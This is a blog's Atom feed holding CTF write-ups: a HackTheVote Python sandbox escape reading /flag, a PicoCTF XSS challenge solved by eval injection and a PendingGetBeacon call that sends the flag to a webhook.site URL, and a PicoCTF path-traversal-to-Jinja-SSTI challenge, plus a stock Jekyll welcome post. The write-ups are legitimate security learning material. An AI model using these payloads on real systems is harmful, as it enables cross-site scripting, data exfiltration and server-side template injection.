<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-11-05T22:35:51+07:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">HSw109</title><subtitle>just me hsw109</subtitle><entry><title type="html">small snake WU</title><link href="http://localhost:4000/write-up/hackthevote2024/2024/11/05/small-snake.html" rel="alternate" type="text/html" title="small snake WU" /><published>2024-11-05T15:23:10+07:00</published><updated>2024-11-05T15:23:10+07:00</updated><id>http://localhost:4000/write-up/hackthevote2024/2024/11/05/small-snake</id><content type="html" xml:base="http://localhost:4000/write-up/hackthevote2024/2024/11/05/small-snake.html"><![CDATA[<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">var4</span> <span class="o">=</span> <span class="s">'i'</span><span class="o">+</span><span class="s">'m'</span><span class="o">+</span><span class="s">'p'</span><span class="o">+</span><span class="s">'o'</span><span class="o">+</span><span class="s">'r'</span><span class="o">+</span><span class="s">'t'</span><span class="o">+</span> <span class="s">' kernel_ffi'</span>
    <span class="k">exec</span><span class="p">(</span><span class="n">var4</span><span class="p">)</span>
    <span class="n">func</span> <span class="o">=</span> <span class="s">"filp_o"</span><span class="o">+</span><span class="s">"pen"</span>
    <span class="n">ffi</span> <span class="o">=</span> <span class="n">kernel_ffi</span><span class="p">.</span><span class="n">symbol</span><span class="p">(</span><span class="n">func</span><span class="p">)</span>
    <span class="n">file_path</span> <span class="o">=</span> <span class="s">"/flag"</span><span class="p">;</span> <span class="n">flags</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">mode</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">var2</span> <span class="o">=</span> <span class="s">"file = filp_o"</span><span class="o">+</span><span class="s">"pen(file_path, flags, mode)"</span>
    <span class="k">exec</span><span class="p">(</span><span class="n">var2</span><span class="p">)</span>
    <span class="nb">buffer</span> <span class="o">=</span> <span class="n">kernel_ffi</span><span class="p">.</span><span class="n">kmalloc</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>
    <span class="n">kernel_read</span> <span class="o">=</span> <span class="n">kernel_ffi</span><span class="p">.</span><span class="n">symbol</span><span class="p">(</span><span class="s">"kernel_read"</span><span class="p">)</span>
    <span class="n">pos</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">bytes_read</span> <span class="o">=</span> <span class="n">kernel_read</span><span class="p">(</span><span class="nb">file</span><span class="p">,</span> <span class="nb">buffer</span><span class="p">,</span> <span class="mi">4096</span><span class="p">,</span> <span class="n">pos</span><span class="p">)</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">kernel_ffi</span><span class="p">.</span><span class="nb">str</span><span class="p">(</span><span class="nb">buffer</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</code></pre></div></div>

<p>flag{its_like_rust_in_the_kernel_but_better}</p>]]></content><author><name>HSw109</name></author><category term="write-up" /><category term="HackTheVote2024" /><category term="sandbox" /><summary type="html"><![CDATA[var4 = 'i'+'m'+'p'+'o'+'r'+'t'+ ' kernel_ffi' exec(var4) func = "filp_o"+"pen" ffi = kernel_ffi.symbol(func) file_path = "/flag"; flags = 0; mode = 0 var2 = "file = filp_o"+"pen(file_path, flags, mode)" exec(var2) buffer = kernel_ffi.kmalloc(4096) kernel_read = kernel_ffi.symbol("kernel_read") pos = 0 bytes_read = kernel_read(file, buffer, 4096, pos) data = kernel_ffi.str(buffer) print(data)]]></summary></entry><entry><title type="html">Welcome to Jekyll!</title><link href="http://localhost:4000/jekyll/update/2024/11/05/welcome-to-jekyll.html" rel="alternate" type="text/html" title="Welcome to Jekyll!" /><published>2024-11-05T13:23:10+07:00</published><updated>2024-11-05T13:23:10+07:00</updated><id>http://localhost:4000/jekyll/update/2024/11/05/welcome-to-jekyll</id><content type="html" xml:base="http://localhost:4000/jekyll/update/2024/11/05/welcome-to-jekyll.html"><![CDATA[<p>You’ll find this post in your <code class="language-plaintext highlighter-rouge">_posts</code> directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run <code class="language-plaintext highlighter-rouge">jekyll serve</code>, which launches a web server and auto-regenerates your site when a file is updated.</p>

<p>Jekyll requires blog post files to be named according to the following format:</p>

<p><code class="language-plaintext highlighter-rouge">YEAR-MONTH-DAY-title.MARKUP</code></p>

<p>Where <code class="language-plaintext highlighter-rouge">YEAR</code> is a four-digit number, <code class="language-plaintext highlighter-rouge">MONTH</code> and <code class="language-plaintext highlighter-rouge">DAY</code> are both two-digit numbers, and <code class="language-plaintext highlighter-rouge">MARKUP</code> is the file extension representing the format used in the file. After that, include the necessary front matter. Take a look at the source for this post to get an idea about how it works.</p>

<p>Jekyll also offers powerful support for code snippets:</p>

<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="k">def</span> <span class="nf">print_hi</span><span class="p">(</span><span class="nb">name</span><span class="p">)</span>
  <span class="nb">puts</span> <span class="s2">"Hi, </span><span class="si">#{</span><span class="nb">name</span><span class="si">}</span><span class="s2">"</span>
<span class="k">end</span>
<span class="n">print_hi</span><span class="p">(</span><span class="s1">'Tom'</span><span class="p">)</span>
<span class="c1">#=&gt; prints 'Hi, Tom' to STDOUT.</span></code></pre></figure>

<p>Check out the <a href="https://jekyllrb.com/docs/home">Jekyll docs</a> for more info on how to get the most out of Jekyll. File all bugs/feature requests at <a href="https://github.com/jekyll/jekyll">Jekyll’s GitHub repo</a>. If you have questions, you can ask them on <a href="https://talk.jekyllrb.com/">Jekyll Talk</a>.</p>]]></content><author><name></name></author><category term="jekyll" /><category term="update" /><summary type="html"><![CDATA[You’ll find this post in your _posts directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run jekyll serve, which launches a web server and auto-regenerates your site when a file is updated.]]></summary></entry><entry><title type="html">elements WU</title><link href="http://localhost:4000/write-up/picoctf/2024/09/17/elements.html" rel="alternate" type="text/html" title="elements WU" /><published>2024-09-17T15:23:10+07:00</published><updated>2024-09-17T15:23:10+07:00</updated><id>http://localhost:4000/write-up/picoctf/2024/09/17/elements</id><content type="html" xml:base="http://localhost:4000/write-up/picoctf/2024/09/17/elements.html"><![CDATA[<h1 id="elements---picoctf">Elements - PicoCTF</h1>

<h2 id="indexmjs">index.mjs</h2>
<h3 id="func-createserver">func createServer()</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>createServer((req, res) =&gt; {	
	const  url  =  new  URL(req.url, 'http://127.0.0.1');
	const  csp  = 
[
	"default-src 'none'",
	"style-src 'unsafe-inline'",
	"script-src 'unsafe-eval' 'self'",
	"frame-ancestors 'none'",
	"worker-src 'none'",
	"navigate-to 'none'"
]
</code></pre></div></div>

<p>Noteable that CSP (Content Secure Policy) allows that <code class="language-plaintext highlighter-rouge">"script-src 'unsafe-eval' 'self'"</code>. This means JS can use dangerous function like <code class="language-plaintext highlighter-rouge">eval(), setTimeOut(), ...</code> for executation.</p>

<p><code class="language-plaintext highlighter-rouge">"navigate-to 'none'"</code>  means that we can’t use navigation here (window.location, window.open …)</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>if (req.headers.host  !==  '127.0.0.1:8080') {
csp.push("connect-src https://elements.attest.lol/");
}
</code></pre></div></div>

<p>if host header is not 127.0.0.1:8080 =&gt; fetch from https://elements.attest.lol/. Afterwards, nothing special until this</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>else if (url.pathname === '/remoteCraft') {
try {
    const { recipe, xss } = JSON.parse(url.searchParams.get('recipe'));
    assert(typeof xss === 'string');
    assert(xss.length &lt; 300);
    assert(recipe instanceof Array);
    assert(recipe.length &lt; 50);
    for (const step of recipe) {
        assert(step instanceof Array);
        assert(step.length === 2);
        for (const element of step) {
            assert(typeof xss === 'string');
            assert(element.length &lt; 50);
        }
    }
    visit({ recipe, xss });
} catch(e) {
    console.error(e);
    return res.writeHead(400).end('invalid recipe!');
}
return res.end('visiting!'); }
</code></pre></div></div>

<p>In pathname /remoteCraft, we can put the parameter <strong>recipe</strong>  in the URL, then use function <em>assert()</em> to check the condition of parameter, if everything goes well =&gt; execute function <em>visit()</em></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>const url1 = 'http://localhost:8080/remoteCraft?recipe={"recipe":[["Ash","Fire"]],"xss":"exampleString"}';
const url = new URL(url1);
const { recipe, xss } = JSON.parse(url.searchParams.get('recipe'));
console.log(recipe);
console.log(xss);
</code></pre></div></div>

<p>After use a small JS to see what input and output look likes.</p>

<blockquote>
  <p>So all what we need to do is modify the XSS part =&gt; Execute visit() =&gt; Get the flag of state object</p>
</blockquote>

<h3 id="func-visit">func visit()</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> async function visit(state) {

if (visiting) return; 
	visiting = true;

state = { ...state, flag }; // inherit state object, and has attribute flag:
const userDataDir = await mkdtemp(join(tmpdir(), 'elements-')); // ex: /tmp/elements-r3k2P7

await mkdir(join(userDataDir, 'Default'));
await writeFile(join(userDataDir, 'Default', 'Preferences'), JSON.stringify({ // file JSON Preferences is stored at /tmp/elements-r3k2P7/Default/
    net: {
        network_prediction_options: 2 // content of preferences
    }
}));

const proc = spawn(
    '/usr/bin/chromium-browser-unstable', [
        `--user-data-dir=${userDataDir}`,
        '--profile-directory=Default',
        '--no-sandbox',
        '--js-flags=--noexpose_wasm,--jitless',
        '--disable-gpu',
        '--no-first-run',
        '--enable-experimental-web-platform-features',
        `http://127.0.0.1:8080/#${Buffer.from(JSON.stringify(state)).toString('base64')}` // contain recipe and xss attribute
    ],
    { detached: true } // ensures the spawned process will run independently of the parent process, meaning it won't be terminated if the parent process (the Node.js app) exits.
);

await sleep(10000);
try {
    process.kill(-proc.pid);
} catch (e) {}
await sleep(500);
await rm(userDataDir, { recursive: true, force: true, maxRetries: 10 });
visiting = false;
}
</code></pre></div></div>

<p>As we can see that visit function, the input object has been inherited all attribute, additional has new attribute which is our flag</p>

<table>
  <thead>
    <tr>
      <th>state</th>
      <th>new state</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>recipe: [[“Ash”,”Fire”],[“Water”,”Steam”]]</td>
      <td>recipe: [[“Ash”,”Fire”],[“Water”,”Steam”]]</td>
    </tr>
    <tr>
      <td>xss: ‘exampleString’</td>
      <td>xss: ‘exampleString’</td>
    </tr>
    <tr>
      <td> </td>
      <td>flag: picoCTF{test_flag}</td>
    </tr>
  </tbody>
</table>

<p>Then new process “chromium” and access <code class="language-plaintext highlighter-rouge">http://127.0.0.1:8080#${Buffer.from(JSON.stringify(state)).toString('base64')</code>
The arguments have its functionality but notable that:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">--enable-experimental-web-platform-features</code> :  User can use experimental feature of chromium</li>
</ul>

<p>After that, the server sleep 10s then kill all process, then remove the temporary directory.</p>

<h2 id="indexjs">index.js</h2>

<p>After skimming, i see that vulnerable code that the back-end allow by CSP: <code class="language-plaintext highlighter-rouge">"script-src 'unsafe-eval' 'self'"</code></p>

<h3 id="func-evaluate">func evaluate()</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>const evaluate = (...items) =&gt; {
    const [a, b] = items.sort();
    for (const [ingredientA, ingredientB, result] of recipes) {
        if (ingredientA === a &amp;&amp; ingredientB == b) {
            if (result === 'XSS' &amp;&amp; state.xss) {
                eval(state.xss);                                            
            }
            return result;
        }
    }
    return null;
}
</code></pre></div></div>

<p>The function validate the elements, if its combined = “XSS” and JSON object <strong>“state”</strong> has attribute xss, then server execute it. This is the main part of this attack.</p>

<p>CTRL-F the this function, this only called in 2 another location: create() and last try/catch block. The function create() seems nothing special, just check the elements and if new element found, store it in a map found[].</p>

<h3 id="trycatch">try/catch()</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>try {
    state = JSON.parse(atob(window.location.hash.slice(1)));
    for (const [a, b] of state.recipe) {
        if (!found.has(a) || !found.has(b)) {
            break;
        }
        const result = evaluate(a, b);
        found.set(result, elements.get(result));
    }
} catch(e) {}
</code></pre></div></div>

<p>There we have <strong>state</strong> is the JSON obj after base64 decoded <code class="language-plaintext highlighter-rouge">atob()</code>
 <code class="language-plaintext highlighter-rouge">window.location.hash.slice(1)</code> is taking the after “#” part of current URL.
  Example: http://example.com/#123abc if go on this func =&gt; 123abc</p>

<p>Then if statement check the ingredient element already founded =&gt; execute the <code class="language-plaintext highlighter-rouge">evaluate()</code> function and add result element to the founded map.</p>

<h2 id="exploit">Exploit</h2>

<p>So, i have to take my time for playing this game till i got XSS (waste of time) to met the condition of evaluate() function.</p>

<p>Take first step with simple payload: <code class="language-plaintext highlighter-rouge">{"recipe":[["Exploit","Web Design"]],"xss":"alert('1')"}</code>
=&gt; http://localhost:8080/#eyJyZWNpcGUiOltbIkV4cGxvaXQiLCJXZWIgRGVzaWduIl1dLCJ4c3MiOiJhbGVydCgnMScpIn0=</p>

<p>Its worked!</p>

<p>Chromium stored the attribute of <strong>state</strong> so i need to see content of state, this bring me to this payload:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{"recipe":[["Exploit","Web Design"]],"xss":"let output='';for(const[key,value]of Object.entries(state)){output+=`${key}:${value}`;}alert(output);"}
</code></pre></div></div>

<p>Encode it and bring to the URL, also worked too! 
=&gt; recipe:Exploit,Web Designxss:let output=’‘;for(const[key,value]of Object.entries(state)){output+=<code class="language-plaintext highlighter-rouge">${key}:${value}</code>;}alert(output);</p>

<p>Its processing in Chromium, so i need something that return the flag to me. THAT WHY I USED WEBHOOK!</p>

<p>=&gt; payload: <code class="language-plaintext highlighter-rouge">http://localhost:8080/remoteCraft?recipe={"recipe":[["Exploit", "Web Design"]],"xss":"let output='';for(const[key,value]of Object.entries(state)){output+=`${key}:${value}`;};window.location = 'https://webhook.site/09e19f10-a88e-405c-b6c1-4870e0c497d5/?e=' + output"}</code></p>

<p>The Chromium processing, then</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://127.0.0.1:8080/#${Buffer.from(JSON.stringify(state)).toString('base64')} accessed by browser =&gt;  **evaluate()** executed =&gt; **eval()** execute =&gt; **XSS** !!!
</code></pre></div></div>

<p>Unfortunately, despite many tries, the webhook cant catch my request, then i realize that <code class="language-plaintext highlighter-rouge">"navigate-to 'none'"</code> in CSP  :(</p>

<p>After hours, i found that we can use <code class="language-plaintext highlighter-rouge">window.location.hash.slice(1)</code> again to get the flag, cause our location is indeed containing the flag. But we don’t have anything to return it.</p>

<p>So desperately, so i checked the solution…, then thing i missed is: <code class="language-plaintext highlighter-rouge">--enable-experimental-web-platform-features</code>. AISHHHH! im done, its so tricky, there are a API in testing Chrome Feature that is <strong>PendingBeacon</strong> class, which has PendingGetBeacon() API supports JavaScript. Normally the testing feature is not affected by the CSP.</p>

<p><a href="https://chromium.googlesource.com/chromium/src/+/refs/tags/107.0.5304.8/docs/experiments/page-unload-beacon.md">Here is the document</a></p>

<p>I have tried another API but its seem not work with this time.</p>

<p>=&gt; payload:  <code class="language-plaintext highlighter-rouge">http://localhost:8080/remoteCraft?recipe={"recipe":[["Exploit", "Web Design"]],"xss":"new PendingGetBeacon('https://webhook.site/09e19f10-a88e-405c-b6c1-4870e0c497d5/?e=' + window.location.hash.slice(1), {timeout: 1000});"}</code></p>

<p>Then we got base64 request from webhook:
<code class="language-plaintext highlighter-rouge">https://webhook.site/09e19f10-a88e-405c-b6c1-4870e0c497d5/?e=eyJyZWNpcGUiOltbIkV4cGxvaXQiLCJXZWIgRGVzaWduIl1dLCJ4c3MiOiJuZXcgUGVuZGluZ0dldEJlYWNvbignaHR0cHM6Ly93ZWJob29rLnNpdGUvMDllMTlmMTAtYTg4ZS00MDVjLWI2YzEtNDg3MGUwYzQ5N2Q1Lz9lPScgKyB3aW5kb3cubG9jYXRpb24uaGFzaC5zbGljZSgxKSwge3RpbWVvdXQ6IDEwMDB9KTsiLCJmbGFnIjoicGljb0NURntsaXR0bGVfYWxjaGVteV93YXNfdGhlXzBnX2dhbWVfZG9lc19hbnlvbmVfcmVtZW1iM3JfOTg4OWZkNGF9IGJ0dyBjb250YWN0IG1lIG9uIGRpc2NvcmQgd2l0aCB1ciBzb2x1dGlvbiB0aGFua3MgQGVoaHRoaW5nXG4ifQ==</code></p>

<p>Decode =&gt; Flag: picoCTF{little_alchemy_was_the_0g_game_does_anyone_rememb3r_9889fd4a}</p>]]></content><author><name>HSw109</name></author><category term="write-up" /><category term="PicoCTF" /><category term="web" /><summary type="html"><![CDATA[Elements - PicoCTF]]></summary></entry><entry><title type="html">notepad WU</title><link href="http://localhost:4000/write-up/picoctf/2024/09/15/notepad.html" rel="alternate" type="text/html" title="notepad WU" /><published>2024-09-15T15:23:10+07:00</published><updated>2024-09-15T15:23:10+07:00</updated><id>http://localhost:4000/write-up/picoctf/2024/09/15/notepad</id><content type="html" xml:base="http://localhost:4000/write-up/picoctf/2024/09/15/notepad.html"><![CDATA[<h1 id="notepad---picoctf">Notepad - PicoCTF</h1>

<h2 id="apppy">app.py</h2>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/user/&lt;name&gt;'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">greet_user</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'greet.html'</span><span class="p">,</span> <span class="n">name</span><span class="o">=</span><span class="n">name</span><span class="p">)</span>
</code></pre></div></div>

<p>https://notepad.mars.picoctf.net/ render <strong>index.html</strong> with context variable “error” .</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">"/new"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">"POST"</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">create</span><span class="p">():</span>
    <span class="n">content</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"content"</span><span class="p">,</span> <span class="s">""</span><span class="p">)</span>
    <span class="k">if</span> <span class="s">"_"</span> <span class="ow">in</span> <span class="n">content</span> <span class="ow">or</span> <span class="s">"/"</span> <span class="ow">in</span> <span class="n">content</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s">"index"</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="s">"bad_content"</span><span class="p">))</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">content</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">512</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s">"index"</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="s">"long_content"</span><span class="p">,</span> <span class="nb">len</span><span class="o">=</span><span class="nb">len</span><span class="p">(</span><span class="n">content</span><span class="p">)))</span>
    <span class="n">name</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"static/</span><span class="si">{</span><span class="n">url_fix</span><span class="p">(</span><span class="n">content</span><span class="p">[</span><span class="si">:</span><span class="mi">128</span><span class="p">])</span><span class="si">}</span><span class="s">-</span><span class="si">{</span><span class="n">token_urlsafe</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span><span class="si">}</span><span class="s">.html"</span>
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="s">"w"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
</code></pre></div></div>
<p>https://notepad.mars.picoctf.net/new for uploading notes. Variable <strong>content</strong> is taken from the HTML form, filtered with ‘_’ and ‘/’ and if occur, redirect to error html. If not, store new file html note in folder static with file name is <code class="language-plaintext highlighter-rouge">static/{url_fix(content[:128])}-{token_urlsafe(8)}.html</code></p>

<h3 id="url_fix">url_fix()</h3>
<p>Its deprecated in the werkberg library (<a href="https://tedboy.github.io/flask/generated/werkzeug.url_fix.html">here</a>). Source:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">url_fix</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">charset</span><span class="o">=</span><span class="s">'utf-8'</span><span class="p">):</span>
    <span class="sa">r</span><span class="s">"""Sometimes you get an URL by a user that just isn't a real URL because
 it contains unsafe characters like ' ' and so on. This function can fix
 some of the problems in a similar way browsers handle data entered by the
 user:

 &gt;&gt;&gt; url_fix(u'http://de.wikipedia.org/wiki/Elf (Begriffskl\xe4rung)')
 'http://de.wikipedia.org/wiki/Elf%20(Begriffskl%C3%A4rung)'

 :param s: the string with the URL to fix.
 :param charset: The target charset for the URL if the url was given as
 unicode string.
 """</span>
    <span class="c1"># First step is to switch to unicode processing and to convert
</span>    <span class="c1"># backslashes (which are invalid in URLs anyways) to slashes.  This is
</span>    <span class="c1"># consistent with what Chrome does.
</span>    <span class="n">s</span> <span class="o">=</span> <span class="n">to_unicode</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">charset</span><span class="p">,</span> <span class="s">'replace'</span><span class="p">).</span><span class="n">replace</span><span class="p">(</span><span class="s">'</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> <span class="s">'/'</span><span class="p">)</span>

    <span class="c1"># For the specific case that we look like a malformed windows URL
</span>    <span class="c1"># we want to fix this up manually:
</span>    <span class="k">if</span> <span class="n">s</span><span class="p">.</span><span class="n">startswith</span><span class="p">(</span><span class="s">'file://'</span><span class="p">)</span> <span class="ow">and</span> <span class="n">s</span><span class="p">[</span><span class="mi">7</span><span class="p">:</span><span class="mi">8</span><span class="p">].</span><span class="n">isalpha</span><span class="p">()</span> <span class="ow">and</span> <span class="n">s</span><span class="p">[</span><span class="mi">8</span><span class="p">:</span><span class="mi">10</span><span class="p">]</span> <span class="ow">in</span> <span class="p">(</span><span class="s">':/'</span><span class="p">,</span> <span class="s">'|/'</span><span class="p">):</span>
        <span class="n">s</span> <span class="o">=</span> <span class="s">'file:///'</span> <span class="o">+</span> <span class="n">s</span><span class="p">[</span><span class="mi">7</span><span class="p">:]</span>

    <span class="n">url</span> <span class="o">=</span> <span class="n">url_parse</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
    <span class="n">path</span> <span class="o">=</span> <span class="n">url_quote</span><span class="p">(</span><span class="n">url</span><span class="p">.</span><span class="n">path</span><span class="p">,</span> <span class="n">charset</span><span class="p">,</span> <span class="n">safe</span><span class="o">=</span><span class="s">'/%+$!*</span><span class="se">\'</span><span class="s">(),'</span><span class="p">)</span>
    <span class="n">qs</span> <span class="o">=</span> <span class="n">url_quote_plus</span><span class="p">(</span><span class="n">url</span><span class="p">.</span><span class="n">query</span><span class="p">,</span> <span class="n">charset</span><span class="p">,</span> <span class="n">safe</span><span class="o">=</span><span class="s">':&amp;%=+$!*</span><span class="se">\'</span><span class="s">(),'</span><span class="p">)</span>
    <span class="n">anchor</span> <span class="o">=</span> <span class="n">url_quote_plus</span><span class="p">(</span><span class="n">url</span><span class="p">.</span><span class="n">fragment</span><span class="p">,</span> <span class="n">charset</span><span class="p">,</span> <span class="n">safe</span><span class="o">=</span><span class="s">':&amp;%=+$!*</span><span class="se">\'</span><span class="s">(),'</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">to_native</span><span class="p">(</span><span class="n">url_unparse</span><span class="p">((</span><span class="n">url</span><span class="p">.</span><span class="n">scheme</span><span class="p">,</span> <span class="n">url</span><span class="p">.</span><span class="n">encode_netloc</span><span class="p">(),</span>
                                  <span class="n">path</span><span class="p">,</span> <span class="n">qs</span><span class="p">,</span> <span class="n">anchor</span><span class="p">)))</span>
</code></pre></div></div>

<p>Notice that we have</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">s</span> <span class="o">=</span> <span class="n">to_unicode</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">charset</span><span class="p">,</span> <span class="s">'replace'</span><span class="p">).</span><span class="n">replace</span><span class="p">(</span><span class="s">'</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> <span class="s">'/'</span><span class="p">)</span>
</code></pre></div></div>
<p>which is crucial for bypass “/” filter.</p>

<h2 id="indexhtml">index.html</h2>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="cp">&lt;!doctype  html&gt;</span>
    {% if error is not none %}
		    <span class="nt">&lt;h3&gt;</span>
		    error: {{ error }}
		    <span class="nt">&lt;/h3&gt;</span>
		    {% include "errors/" + error + ".html" ignore missing %}
    {% endif %}
    <span class="nt">&lt;h2&gt;</span>make a new note<span class="nt">&lt;/h2&gt;</span>
    <span class="nt">&lt;form</span>  <span class="na">action=</span><span class="s">"/new"</span>  <span class="na">method=</span><span class="s">"POST"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;textarea</span>  <span class="na">name=</span><span class="s">"content"</span><span class="nt">&gt;&lt;/textarea&gt;</span>
    <span class="nt">&lt;input</span>  <span class="na">type=</span><span class="s">"submit"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;/form&gt;</span> 
</code></pre></div></div>

<p>Here, flask used Jinja2 (can SSTI). The <strong>sink</strong> could be the jinja template. Since https://notepad.mars.picoctf.net/?error=7*7 not works, cause the server treats the error string, so the Jinja template could not evaluate it.</p>

<p>=&gt; <strong>Sink</strong>: {% include “errors/” + error + “.html” ignore missing %}</p>

<p>To do that, we have:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">name</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"static/</span><span class="si">{</span><span class="n">url_fix</span><span class="p">(</span><span class="n">content</span><span class="p">[</span><span class="si">:</span><span class="mi">128</span><span class="p">])</span><span class="si">}</span><span class="s">-</span><span class="si">{</span><span class="n">token_urlsafe</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span><span class="si">}</span><span class="s">.html"</span>
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="s">"w"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
</code></pre></div></div>
<p>From there, we can perform directory traversal to folder <strong>errors</strong>, then by</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> {% include "errors/" + error + ".html" ignore missing %}
</code></pre></div></div>

<p>we evaluate SSTI payload.</p>

<h2 id="exploit">Exploit</h2>
<p>With use of url_fix(). We note:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>make a new note

..\templates\errors\123abc
</code></pre></div></div>

<p>=&gt; Redirect to: https://notepad.mars.picoctf.net/templates/errors/123abc%0D%0A-4vnyXEK_tLc.html. Then we access it. 
=&gt; https://notepad.mars.picoctf.net/?error=123abc%0D%0A-4vnyXEK_tLc</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>error: 123abc -4vnyXEK_tLc

 make a new note
</code></pre></div></div>

<p>Do the same with simple payload {{7*7}}</p>

<p>=&gt;</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>error: 123abc {{7*7}}-mAQRWwnJPVg


make a new note
</code></pre></div></div>

<p>Since it in the name of file, we cant evaluate it, to do this: from <strong>app.py</strong>:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="n">name</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"static/</span><span class="si">{</span><span class="n">url_fix</span><span class="p">(</span><span class="n">content</span><span class="p">[</span><span class="si">:</span><span class="mi">128</span><span class="p">])</span><span class="si">}</span><span class="s">-</span><span class="si">{</span><span class="n">token_urlsafe</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span><span class="si">}</span><span class="s">.html"</span>
</code></pre></div></div>

<p>After processing with <code class="language-plaintext highlighter-rouge">url_fix()</code>, the <code class="language-plaintext highlighter-rouge">{{7*7}}</code> expression contained special character <code class="language-plaintext highlighter-rouge">{</code> and <code class="language-plaintext highlighter-rouge">}</code>. So if its exist in the URL, we just pass the value of variable <code class="language-plaintext highlighter-rouge">error</code>, not the file that we made.</p>

<p>So what we need is make the content longer, then the payload is outbound of 128 characters =&gt;
URL path is valid for access =&gt; SSTI!</p>

<p><strong>Payload:</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>..\templates\errors\aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa{{7*7}}
</code></pre></div></div>

